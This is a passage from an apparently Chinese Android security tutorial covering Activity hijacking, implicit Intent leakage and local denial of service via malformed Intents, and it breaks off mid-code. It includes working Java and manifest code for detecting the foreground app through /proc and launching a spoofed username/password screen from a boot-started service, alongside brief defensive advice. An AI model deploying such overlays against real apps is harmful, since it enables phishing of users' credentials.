<span class=\"number\">6.0</span>以上 getRunningAppProcess也失效了，系统关闭了三方软件对系统进程的访问</span><br><span class=\"line\">\t   \t 目前的方法:</span><br><span class=\"line\">\t   \t <span class=\"number\">1.</span>使用国外大佬的代码 AndroidProcesses</span><br><span class=\"line\">\t   \t 参考网址：https:<span class=\"comment\">//github.com/jaredrummler/AndroidProcesses</span></span><br><span class=\"line\">\t   \t \t\t   https:<span class=\"comment\">//jaredrummler.com/2017/09/13/android-processes/</span></span><br><span class=\"line\">\t   \t \t\t   https:<span class=\"comment\">//www.itranslater.com/qa/details/2325835735628252160</span></span><br><span class=\"line\">\t   \t <span class=\"number\">2.</span>使用第三方开源库：libsuperuser</span><br><span class=\"line\">\t   \t 使用文章：https:<span class=\"comment\">//blog.csdn.net/daydayplayphone/article/details/52236148</span></span><br><span class=\"line\">\t   \t 开源网址：https:<span class=\"comment\">//github.com/Chainfire/libsuperuser</span></span><br><span class=\"line\">\t   \t 第三种方法主要是利用Google 应用程序可以访问 /proc/</span><br><span class=\"line\">\t   \t https:<span class=\"comment\">//blog.csdn.net/brycegao321/article/details/76966424</span></span><br><span class=\"line\">\t   <span class=\"number\">4</span>)我们发现使用这两种方法都只能列出进程列表，并不能获取正在运行的进程，我们需要进一步过滤</span><br><span class=\"line\">\t   \t 参考网址：https:<span class=\"comment\">//blog.csdn.net/dq1005/article/details/51453121</span></span><br><span class=\"line\">\t   \t \t\t   https:<span class=\"comment\">//www.jianshu.com/p/f3aea648dfbb</span></span><br><span class=\"line\">\t   \t 如何判断Android包名获取进程是否存活：https:<span class=\"comment\">//blog.csdn.net/weixin_39352694/article/details/83620517</span></span><br><span class=\"line\">\t   \t 如何查看前台进程的六种方法：https:<span class=\"comment\">//github.com/wenmingvs/AndroidProcess</span></span><br></pre></td></tr></table></figure>\n\n<p>我们编写获取当前目标进程的代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ForegroundProcess</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">AID_APP</span> <span class=\"operator\">=</span> <span class=\"number\">10000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">AID_USER</span> <span class=\"operator\">=</span> <span class=\"number\">100000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">getForegroundApp</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        File[] files = <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(<span class=\"string\">&quot;/proc&quot;</span>).listFiles();</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">lowestOomScore</span> <span class=\"operator\">=</span> Integer.MAX_VALUE;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">foregroundProcess</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (File file : files) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!file.isDirectory()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"type\">int</span> pid;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                pid = Integer.parseInt(file.getName());</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NumberFormatException e) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">cgroup</span> <span class=\"operator\">=</span> read(String.format(<span class=\"string\">&quot;/proc/%d/cgroup&quot;</span>, pid));</span><br><span class=\"line\">                String[] lines = cgroup.split(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">                String cpuSubsystem;</span><br><span class=\"line\">                String cpuaccctSubsystem;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (lines.length == <span class=\"number\">2</span>) &#123;<span class=\"comment\">// 有的手机里cgroup包含2行或者3行，我们取cpu和cpuacct两行数据</span></span><br><span class=\"line\">                    cpuSubsystem = lines[<span class=\"number\">0</span>];</span><br><span class=\"line\">                    cpuaccctSubsystem = lines[<span class=\"number\">1</span>];</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (lines.length == <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">                    cpuSubsystem = lines[<span class=\"number\">0</span>];</span><br><span class=\"line\">                    cpuaccctSubsystem = lines[<span class=\"number\">2</span>];</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!cpuaccctSubsystem.endsWith(Integer.toString(pid))) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// not an application process</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (cpuSubsystem.endsWith(<span class=\"string\">&quot;bg_non_interactive&quot;</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// background policy</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">cmdline</span> <span class=\"operator\">=</span> read(String.format(<span class=\"string\">&quot;/proc/%d/cmdline&quot;</span>, pid));</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (cmdline.contains(<span class=\"string\">&quot;com.android.systemui&quot;</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"type\">int</span> <span class=\"variable\">uid</span> <span class=\"operator\">=</span> Integer.parseInt(cpuaccctSubsystem.split(<span class=\"string\">&quot;:&quot;</span>)[<span class=\"number\">2</span>]</span><br><span class=\"line\">                        .split(<span class=\"string\">&quot;/&quot;</span>)[<span class=\"number\">1</span>].replace(<span class=\"string\">&quot;uid_&quot;</span>, <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (uid &gt;= <span class=\"number\">1000</span> &amp;&amp; uid &lt;= <span class=\"number\">1038</span>) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// system process</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"type\">int</span> <span class=\"variable\">appId</span> <span class=\"operator\">=</span> uid - AID_APP;</span><br><span class=\"line\">                <span class=\"type\">int</span> <span class=\"variable\">userId</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"comment\">// loop until we get the correct user id.</span></span><br><span class=\"line\">                <span class=\"comment\">// 100000 is the offset for each user.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">while</span> (appId &gt; AID_USER) &#123;</span><br><span class=\"line\">                    appId -= AID_USER;</span><br><span class=\"line\">                    userId++;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (appId &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">// u&#123;user_id&#125;_a&#123;app_id&#125; is used on API 17+ for multiple user</span></span><br><span class=\"line\">                <span class=\"comment\">// account support.</span></span><br><span class=\"line\">                <span class=\"comment\">// String uidName = String.format(&quot;u%d_a%d&quot;, userId, appId);</span></span><br><span class=\"line\">                <span class=\"type\">File</span> <span class=\"variable\">oomScoreAdj</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(String.format(</span><br><span class=\"line\">                        <span class=\"string\">&quot;/proc/%d/oom_score_adj&quot;</span>, pid));</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (oomScoreAdj.canRead()) &#123;</span><br><span class=\"line\">                    <span class=\"type\">int</span> <span class=\"variable\">oomAdj</span> <span class=\"operator\">=</span> Integer.parseInt(read(oomScoreAdj</span><br><span class=\"line\">                            .getAbsolutePath()));</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (oomAdj != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"type\">int</span> <span class=\"variable\">oomscore</span> <span class=\"operator\">=</span> Integer.parseInt(read(String.format(</span><br><span class=\"line\">                        <span class=\"string\">&quot;/proc/%d/oom_score&quot;</span>, pid)));</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (oomscore &lt; lowestOomScore) &#123;</span><br><span class=\"line\">                    lowestOomScore = oomscore;</span><br><span class=\"line\">                    foregroundProcess = cmdline;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> foregroundProcess;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">read</span><span class=\"params\">(String path)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">StringBuilder</span> <span class=\"variable\">output</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">        <span class=\"type\">BufferedReader</span> <span class=\"variable\">reader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BufferedReader</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileReader</span>(path));</span><br><span class=\"line\">        output.append(reader.readLine());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">String</span> <span class=\"variable\">line</span> <span class=\"operator\">=</span> reader.readLine(); line != <span class=\"literal\">null</span>; line = reader</span><br><span class=\"line\">                .readLine()) &#123;</span><br><span class=\"line\">            output.append(<span class=\"string\">&#x27;\\n&#x27;</span>).append(line);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        reader.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> output.toString().trim();<span class=\"comment\">// 不调用trim()，包名后会带有乱码</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们继续编写劫持替换的测试类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SecondActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Boolean flag ;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_second);</span><br><span class=\"line\">        Log.w(<span class=\"string\">&quot;TAGSecod&quot;</span>,<span class=\"string\">&quot;切换&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">EditText</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> findViewById(R.id.editTextTextPersonName);</span><br><span class=\"line\">        <span class=\"type\">EditText</span> <span class=\"variable\">passward</span> <span class=\"operator\">=</span> findViewById(R.id.editTextTextPassword);</span><br><span class=\"line\">        <span class=\"type\">Button</span> <span class=\"variable\">button</span> <span class=\"operator\">=</span> findViewById(R.id.button);</span><br><span class=\"line\">            button.setOnClickListener(<span class=\"keyword\">new</span> <span class=\"title class_\">View</span>.OnClickListener() &#123;</span><br><span class=\"line\">                <span class=\"meta\">@Override</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onClick</span><span class=\"params\">(View v)</span> &#123;</span><br><span class=\"line\">                    Log.w(<span class=\"string\">&quot;TAG&quot;</span>, <span class=\"string\">&quot;成功劫持进入该界面&quot;</span>);</span><br><span class=\"line\">                    flag =<span class=\"literal\">false</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后在我们的配置文件中加入相应的权限和配置信息：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">package</span>=<span class=\"string\">&quot;com.example.activityhajacker&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">application</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">android:allowBackup</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">android:icon</span>=<span class=\"string\">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;@string/app_name&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">android:roundIcon</span>=<span class=\"string\">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">android:supportsRtl</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">android:theme</span>=<span class=\"string\">&quot;@style/Theme.ActivityHajacker&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SecondActivity&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">service</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.HijackingService&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:enabled</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;true&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">receiver</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.HijackingReciver&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:enabled</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">application</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们需要将服务的时间设置成6秒，避免程序界面还未加载就劫持了</p>\n<p><strong>效果演示：</strong></p>\n<p>我们编写劫持类安装，打开：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/13.png\" alt=\"image-20210905193109596\"></p>\n<p>我们可以发现劫持类在后台运行：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/14.png\" alt=\"image-20210905193315233\"></p>\n<p>我们打开目标程序：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/16.png\" alt=\"image-20210905193402155\"></p>\n<p>等待5秒，然后劫持成功，这个时间我们可以在代码段调整：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/17.png\" alt=\"image-20210905193503857\"></p>\n<p>这样我们成功完成了对目标程序劫持，这里我只编写了一个简易的界面，大家可以编写更加复杂的界面，这主要是针对Android 6.0平台的劫持，各位也可以试试其他版本的平台</p>\n<h4 id=\"（3）安全防护\"><a href=\"#（3）安全防护\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">如果真的爆发了这种恶意程序，我们并不能在启动程序时每一次都那么小心去查看判断当前在运行的是哪一个程序，当android:noHistory=<span class=\"string\">&quot;true&quot;</span>时上面的方法也无效 </span><br><span class=\"line\">目前，对activity劫持的防护，只能是适当给用户警示信息。一些简单的防护手段就是显示当前运行的进程提示框。</span><br><span class=\"line\">梆梆加固则是在进程切换的时候给出提示，并使用白名单过滤。</span><br><span class=\"line\">参考网址：https:<span class=\"comment\">//blog.csdn.net/ruingman/article/details/51146152</span></span><br><span class=\"line\">          http:<span class=\"comment\">//blog.chinaunix.net/uid-16728139-id-4962659.html</span></span><br><span class=\"line\">          https:<span class=\"comment\">//blog.csdn.net/u012195899/article/details/70172241?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-9.essearch_pc_relevant&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-9.essearch_pc_relevant</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/18.png\" alt=\"image-20210905193503857\"></p>\n<p>通过它提示程序进入后台来提示用户</p>\n<h3 id=\"3-隐私启动Intent包含敏感数据\"><a href=\"#3-隐私启动Intent包含敏感数据\" class=\"headerlink\" title=\"3.隐私启动Intent包含敏感数据\"></a>3.隐私启动Intent包含敏感数据</h3><h4 id=\"（1）原理介绍-2\"><a href=\"#（1）原理介绍-2\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>背景知识：Intent可分为隐私(implicitly)和显式(explicitly)两种</span><br><span class=\"line\">(<span class=\"number\">1</span>)显式Intent：即在构造Intent对象时就指定接收者，它一般用在知道目标组件名称的前提下，</span><br><span class=\"line\">   一般是在相同的应用程序内部实现的，如下：</span><br><span class=\"line\">   <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(MainActivit.<span class=\"built_in\">this</span>, NewActivity.class);</span><br><span class=\"line\">   startActivity(intent); </span><br><span class=\"line\">(<span class=\"number\">2</span>)隐式Intent：即Intent的发送者在构造Intent对象时，并不知道也不关心接收者是谁，有利于</span><br><span class=\"line\">降低发送者和接收者之间的耦合，它一般用在没有明确指出目标组件名称的<span class=\"number\">1</span>前提下，一般是用于</span><br><span class=\"line\">不同应用程序之间，如下：</span><br><span class=\"line\">\t<span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">\tintent.setAction(<span class=\"string\">&quot;com.wooyun.test&quot;</span>);</span><br><span class=\"line\">\tstartActivity(intent);</span><br><span class=\"line\">对于显式Intent，Android不需要去做解析，因为目标组件已经很明确，Android需要解析的是那些</span><br><span class=\"line\">隐式Intent,通过解析，将Intent映射给可以处理此Intent的Activity，IntentReceiver或Service</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/19.png\" alt=\"image-20210905193503857\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们有一个应用A,采用Intent隐式传递,它的动作是&quot;X&quot;,此时还有一个应用B,动作也是X,我们在启动的时候，通过Intent隐式传递，就会同时弹出两个界面，我们就不知道到底启动A还是B</span><br></pre></td></tr></table></figure>\n\n<p>因为现在这种漏洞在Android版本更新后，基本很少出现了，所以这里就不做复现和安全防护了</p>\n<h3 id=\"4-拒绝服务攻击\"><a href=\"#4-拒绝服务攻击\" class=\"headerlink\" title=\"4.拒绝服务攻击\"></a>4.拒绝服务攻击</h3><h4 id=\"（1）原理介绍-3\"><a href=\"#（1）原理介绍-3\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">原理介绍：</span><br><span class=\"line\">  Android提供Intent机制来协助应用间的交互和通讯，通过Intent实现对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android通过Intent的描述，负责找到对应组件，完成调用。</span><br><span class=\"line\">  拒绝服务攻击源于程序没有对Intent。getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者向应用发送此类空数据、异常或者畸形数据来达到致使该应用crash的目的，我们可以通过intent发送空数据、异常或畸形数据给正常应用，导致其崩溃。本地拒绝服务可以被竞争方利用来攻击，使得自己的应用崩溃，造成破坏。</span><br><span class=\"line\">  危害：拒绝服务漏洞对于锁屏应用、安全防护类软件危害是巨大的</span><br></pre></td></tr></table></figure>\n\n<p>提到拒绝服务攻击，我们就不得不讲一下Android外部程序的调用方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">总结：</span><br><span class=\"line\">\t<span class=\"number\">1.</span>使用自定义Action</span><br><span class=\"line\">\tA程序中调用的代码为：</span><br><span class=\"line\">\t  <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">\t  intent.setAction(<span class=\"string\">&quot;com.test.action.PLAYER&quot;</span>);               </span><br><span class=\"line\">\t  startActivity(intent);</span><br><span class=\"line\">\tB程序中的AndroidManifest.xml中启动Activity的intent-filter</span><br><span class=\"line\">\t&lt;intent-filter&gt;</span><br><span class=\"line\">                  &lt;action android:name=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class=\"line\">                   &lt;action android:name=<span class=\"string\">&quot;com.test.action.PLAYER&quot;</span> /&gt;</span><br><span class=\"line\">                   &lt;category android:name=<span class=\"string\">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;&lt;!--必须，否则无效--&gt;</span><br><span class=\"line\">                  &lt;category android:name=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class=\"line\">    &lt;/intent-filter&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">2.</span>使用包类名</span><br><span class=\"line\">    A程序中调用的代码为：</span><br><span class=\"line\">     <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">\t intent.setClassName(<span class=\"string\">&quot;com.test&quot;</span>, <span class=\"string\">&quot;com.test.Player&quot;</span>);<span class=\"comment\">//目标程序包名、主进程名</span></span><br><span class=\"line\">\t startActivity(intent);</span><br><span class=\"line\">\tintent.setClassName(arg1,arg2)中arg1是被调用程序B的包名，arg2是B程序中目的activity的完整类名</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t或者使用ComponentName</span><br><span class=\"line\">\t <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();         </span><br><span class=\"line\">\t <span class=\"type\">ComponentName</span> <span class=\"variable\">comp</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(<span class=\"string\">&quot;com.test&quot;</span>, <span class=\"string\">&quot;com.test.Player&quot;</span> ); <span class=\"comment\">//目标程序包名、主进程名</span></span><br><span class=\"line\">\t intent.setComponent(comp); </span><br><span class=\"line\">\t startActivity(intent);</span><br><span class=\"line\">\t </span><br><span class=\"line\">\t B程序被调用中AndroidManifest.xml中启动Activity的intent-filter不需要特别加入其它信息，如下即可：</span><br><span class=\"line\">\t   &lt;intent-filter&gt;</span><br><span class=\"line\">      &lt;action android:name=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class=\"line\">      &lt;category android:name=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class=\"line\"> \t   &lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现-2\"><a href=\"#（2）漏洞复现-2\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>我们查看一个目标应用的AndroidManifest.xml文件：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">activity</span> <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;@string/app_name&quot;</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.MainLoginActivity&quot;</span> <span class=\"attr\">android:excludeFromRecents</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span> <span class=\"attr\">android:windowSoftInputMode</span>=<span class=\"string\">&quot;adjustUnspecified|stateVisible|adjustResize&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们编写一个简易的APP程序，对目标程序进行拒绝服务攻击</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\"><span class=\"type\">ComponentName</span> <span 